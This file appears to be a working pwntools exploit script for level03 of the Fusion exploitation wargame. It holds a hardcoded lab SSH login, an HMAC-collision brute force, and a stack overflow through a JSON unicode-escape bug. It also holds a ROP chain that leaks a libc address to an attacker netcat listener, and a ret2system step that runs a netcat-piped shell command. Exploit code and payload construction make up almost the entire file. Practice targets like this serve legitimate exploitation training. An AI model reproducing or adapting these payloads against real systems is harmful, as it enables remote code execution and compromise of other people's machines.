from pwn import *
from pwnhelper import *
from pwnhelper.dmesg import Dmesg
import json
import threading
import hmac
from hashlib import sha1
import time
import psutil

############################################################################################################################################################
# METHOD DEFINITIONS
############################################################################################################################################################


# no leading 0x
def bytechar_to_raw_hex_string(bc):
    raw_hex_string = hex(ord(bc)).replace("0x", "")
    # print("raw_hex_string:")
    # print(raw_hex_string)
    return raw_hex_string


def random_string(size=10):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=size))

local_dir = None
remote_binary = None
cloned_binary = None
libc = None
port = None
elf = None


def connect(level):
    global remote_binary
    global local_dir
    global cloned_binary
    global port
    global libc
    global elf
    local_dir = "/home/kali/PycharmProjects/fusion/level"+level
    remote_binary = "/opt/fusion/bin/level"+level
    cloned_binary = local_dir+remote_binary
    port = "200"+level
    s = ssh("fusion", "192.168.2.129", password="godmode", cache=True)
    s.libs(remote_binary, local_dir)
    elf = ELF(cloned_binary)
    libc = ELF(local_dir + "/lib/i386-linux-gnu/libc.so.6")
    context.clear()
    context.binary = cloned_binary
    context.log_file = "/tmp/docgillog"
    return s




def gen_payload(token, content, serverip):

    while (True):
        title = random_string(20)

        # msg = json.dumps({
        #     "tags": tags,
        #     "title": title,
        #     "contents": content,
        #     "serverip": serverip
        # })

        # need to do this manually bc json.dumps refuses to accept bytes
        # but target json-c lib does not ;)
        msg = b"{\"tags\": [\"tag1\", \"tag2\", \"tag3\"], \"title\": \"" \
              + bytes(title, "utf-8") \
              + b"\", \"contents\": \"" + content \
              + b"\", \"serverip\": \"" + serverip + b"\"}"

        payload = b""
        payload += token
        payload += b"\n"
        payload += msg

        hashed = hmac.new(token, payload, sha1)
        first_bytes = hashed.hexdigest()[:4]

        # log.debug(f"first_bytes: {first_bytes}")

        if first_bytes == "0000":
            # found hash collision -> valid check passes
            log.debug(f"msg: {msg}")
            log.info(f"Hash: {hashed.hexdigest()}")
            return payload

buf_filler_char = b"A"
overflow_char = b"B"

def gen_overflow_payload(token, overflow, serverip):
    content = b""
    content += buf_filler_char * 1023
    content += b"\\\\u"
    content += overflow
    log.debug(f"content: {content}")
    write("/tmp/docgil", content)
    return gen_payload(token,content,serverip)



last_received_post = b""
listener_nc = None
def start_nc_listener():
    global last_received_post
    global listener_nc
    listener_nc = process(["nc", "-l", "-p", listener_port, guest_ip])
    try:
        while True:
            log.info("nc listener waiting for data")
            data = listener_nc.recv()
            last_received_post = data
            log.info(f"nc listener received post: {data}")
    except EOFError:
        log.info("nc listener done, restarting...")
        start_nc_listener()


def nc_listener_recv_new():
    global last_received_post
    tmp = last_received_post
    while tmp == last_received_post:
        time.sleep(0.5)


############################################################################################################################################################
# INIT
############################################################################################################################################################

s = connect("03")
dmesg = Dmesg(s)

# open_plt = elf.plt["open"]
# fopen = elf.plt["fopen"]
# freopen = elf.plt["freopen"]


# log.info(f"open: {open}")
# log.info(f"fopen: {fopen}")
# log.info(f"freopen: {freopen}")

listener_port = "4000"
guest_ip = "192.168.2.129"
host_ip = "192.168.2.111"

serverip = bytes(host_ip + ":" + listener_port, "utf-8")
# serverip = "127.0.0.1:"+listener_port

log.info(f"serverip: {serverip}")

log.info("starting nc listener")
thread = threading.Thread(target=start_nc_listener)
thread.start()
sleep(1)


# log.info("############################################################################################################################################################")
# log.info("# GET POST REQUEST")
# log.info("############################################################################################################################################################")
#
#
# # connect to process
# nc = s.process(["nc", "localhost", port])
# token = nc.recv().rstrip().replace(b"\"", b"")
# log.info(f"token: {token}")
#
# content = buf_filler_char*10
#
# payload = gen_payload(token, content, serverip)
# log.info(f"payload: {payload}")
# # nc.interactive()
# nc.send(payload)
# log.info("payload sent")
# # send EOF
# # nc.shutdown()
# # only close works here, not shutdown... idk why
# nc.close()
#
# sleep(1)
# assert content in last_received_post
# exit(0)

# log.info("############################################################################################################################################################")
# log.info("# SEGFAULT PROGRAM")
# log.info("############################################################################################################################################################")
# # connect to process
# nc = s.process(["nc", "localhost", port])
# token = nc.recv().rstrip().replace(b"\"", b"")
# log.info(f"token: {token}")
#
# overflow = overflow_char * 1000
#
# payload = gen_overflow_payload(token, overflow, serverip)
# log.info(f"payload: {payload}")
# # nc.interactive()
# nc.send(payload)
# log.info("payload sent")
# # send EOF
# # nc.shutdown()
# # only close works here, not shutdown... idk why
# nc.close()
# nc.kill()
#
# # check if ret adr was overwritten
# time.sleep(1)
# crashed, report = dmesg.has_segfaulted("level03")
#
# assert crashed
# log.info(f"report: {report}")
# assert report.ip == 0x42424242
#
#
#
# log.info("############################################################################################################################################################")
# log.info("# FIND OVERFLOW_BYTES_UNTIL_RET_ADR")
# log.info("############################################################################################################################################################")
#
# # tested this out
# overflow_bytes_until_ret_adr = 160
# while True:
#     log.info("______________________________________________________________________________")
#     log.info(f"overflow_bytes_until_ret_adr: {overflow_bytes_until_ret_adr}")
#
#     nc = s.process(["nc", "localhost", port])
#     token = nc.recv().rstrip().replace(b"\"", b"")
#     log.info(f"token: {token}")
#     overflow = overflow_char * overflow_bytes_until_ret_adr
#     payload = gen_overflow_payload(token, overflow, serverip)
#     log.info(f"payload: {payload}")
#     nc.send(payload)
#     log.info("payload sent")
#     nc.close()
#
#     # check if ret adr was overwritten
#     time.sleep(0.5)
#     crash, report = dmesg.has_segfaulted("level03")
#     if crash:
#         log.warn("segfaulted")
#         log.warn(f"report: {report}")
#         ip = report.ip
#         log.warn("ip: " + hex(ip) + f" {ip}")
#
#         amount_overflowed = hex(ip).count(bytechar_to_raw_hex_string(overflow_char))
#         if amount_overflowed != 4:
#             log.info("did not overwrite ret adr fully yet")
#             overflow_bytes_until_ret_adr += 4
#             continue
#         else:
#             log.info("overwrote ret adr with precise value")
#             # subtract bc we want to stop right before ret adr
#             overflow_bytes_until_ret_adr = overflow_bytes_until_ret_adr - 4
#             break
#     else:
#         overflow_bytes_until_ret_adr += 4
#
# log.info(f"overflow_bytes_until_ret_adr: {overflow_bytes_until_ret_adr}")
# nc.kill()
#
log.info("############################################################################################################################################################")
log.info("# FIND LIBC BASE ADR")
log.info("############################################################################################################################################################")

# use sprintf to rewrite title with actual exit adr to calc libc base adr

overflow_bytes_until_ret_adr = 164 - 1


# puts_plt = elf.plt["puts"]

g_title_adr = elf.symbols["gTitle"]
post_blog_article = elf.symbols["post_blog_article"]
# found key via gdb
asprintf_plt = elf.plt["__asprintf_chk"]

log.info("g_title_adr: " + hex(g_title_adr) + f" {g_title_adr}")
log.info("post_blog_article: " + hex(post_blog_article) + f" {post_blog_article}")
log.info("asprintf_plt: " + hex(asprintf_plt) + f" {asprintf_plt}")


exit_plt = elf.plt["exit"]
exit_got = elf.got["exit"]
# write_plt = elf.plt["write"]

log.info("exit_plt: " + hex(exit_plt) + f" {exit_plt}")
log.info("exit_got: " + hex(exit_got) + f" {exit_got}")
# log.info("write_plt: " + hex(write_plt) + f" {write_plt}")
# log.info(f"puts_plt: {puts_plt}")

nc = s.process(["nc", "localhost", port])
token = nc.recv().rstrip().replace(b"\"", b"")
log.info(f"token: {token}")

# nc.interactive()

overflow = b""
overflow += overflow_char * overflow_bytes_until_ret_adr
overflow += pack(asprintf_plt, 32)
overflow += pack(post_blog_article, 32)
overflow += pack(g_title_adr, 32)
# chk version of asprintf has one more 'flags' arg, just filling with bs, wont segfault
# found out via gdb
overflow += pack(exit_got, 32)
overflow += pack(exit_got, 32)
# # args for write:
# # socket fd -> our nc connection
# overflow += pack(0x3, 32)
# overflow += pack(exit_got, 32)
# overflow += pack(0x4, 32)


payload = gen_overflow_payload(token, overflow, serverip)
log.info(f"payload: {payload}")
nc.send(payload)
log.info("payload sent")
nc.close()
# real exit adr should be printed to listening nc in title

nc_listener_recv_new()
raw_exit_adr = last_received_post.split(b"Content-Length:")[1][9:13]

log.info(f"raw_exit_adr: {raw_exit_adr}")

exit_adr = unpack(raw_exit_adr)

log.info("exit_adr: " + hex(exit_adr) + f" {exit_adr}")

libc_base = exit_adr - libc.symbols['exit']
log.info("libc_base: " + hex(libc_base) + f" {libc_base}")

exit(0)

log.info("############################################################################################################################################################")
log.info("# RET 2 SYSTEM")
log.info("############################################################################################################################################################")


cmd = "/bin/nc -l 4444 | /bin/sh | nc localhost 8080"

system_adr = libc_base + libc.symbols['system']
# bin_sh = libc_base + next(libc.search(b"/bin/sh"))
# log.info("system_adr: " + hex(system_adr) + f" {system_adr}")


nc = s.process(["nc", "localhost", port])
token = nc.recv().rstrip().replace(b"\"", b"")
log.info(f"token: {token}")


overflow = b""
overflow += overflow_char * overflow_bytes_until_ret_adr
overflow += pack(system_adr, 32)
overflow += pack(exit_plt, 32)       # ret system
# args system


payload = gen_overflow_payload(token, overflow, serverip)
log.info(f"payload: {payload}")
nc.send(payload)
log.info("payload sent")

nc.close()

sleep(3)
# new_nc = nc.spawn_process()


crash, report = dmesg.has_segfaulted("level03")
assert not crash
# shell = check_for_shell(nc)
# if shell:
#     nc.interactive()
#     exit(0)
# else:
#     exit(1)
# new_nc.interactive()


# <gTitle>: <pointer> : string
# <gTitle>: <pointer> : <pointer> : string


############################################################################################################################################################
# REOPEN FD'S
############################################################################################################################################################

# # must reopen stdin and stdout for shell
# # freopen("/dev/tty","w",stdout);
# # freopen("/dev/tty","r",stdin);
#
#
# system_adr = libc_base + libc.symbols['system']
# bin_sh = libc_base + next(libc.search(b"/bin/sh"))
#
# # freopen = libc_base + libc.symbols["freopen"]
# # w_string = libc_base + next(libc.search(b"w"))
# # r_string = libc_base + next(libc.search(b"r"))
# # dev_tty = libc_base + next(libc.search(b"/dev/tty"))
# # _stdout = libc_base + libc.symbols['stdout']
# # _stdin = libc_base + libc.symbols['stdin']
# #
# #
# # log.info("system_adr: " + hex(system_adr) + f" {system_adr}")
# # log.info("bin_sh_adr: " + hex(bin_sh) + f" {bin_sh}")
# # log.info("freopen: " + hex(freopen) + f" {freopen}")
# # log.info("w_string: " + hex(w_string) + f" {w_string}")
# # log.info("r_string: " + hex(r_string) + f" {r_string}")
# # log.info("dev_tty: " + hex(dev_tty) + f" {dev_tty}")
# # log.info("_stdout: " + hex(_stdout) + f" {_stdout}")
# # log.info("_stdin: " + hex(_stdin) + f" {_stdin}")
#
#
# nc = s.process(["nc", "localhost", port])
# token = nc.recv().rstrip().replace(b"\"", b"")
# log.info(f"token: {token}")
#
# # nc.interactive()
#
# # overflow = b""
# # overflow += overflow_char * overflow_bytes_until_ret_adr
# # overflow += pack(freopen, 32)
# # overflow += pack(freopen, 32)       # ret freopen1
# # # args freopen1
# # overflow += pack(dev_tty, 32)
# # overflow += pack(w_string, 32)
# # overflow += pack(_stdout, 32)
# # overflow += pack(system_adr, 32)    # ret freopen2
# # # args freopen2
# # overflow += pack(dev_tty, 32)
# # overflow += pack(r_string, 32)
# # overflow += pack(_stdin, 32)
# # overflow += b"45"*4                 # ret system
# # # args system
# # overflow += pack(bin_sh, 32)
#
# payload = gen_overflow_payload(token, overflow, serverip)
# log.info(f"payload: {payload}")
# nc.send(payload)
# log.info("payload sent")
#
# nc.close()
#
# sleep(3)











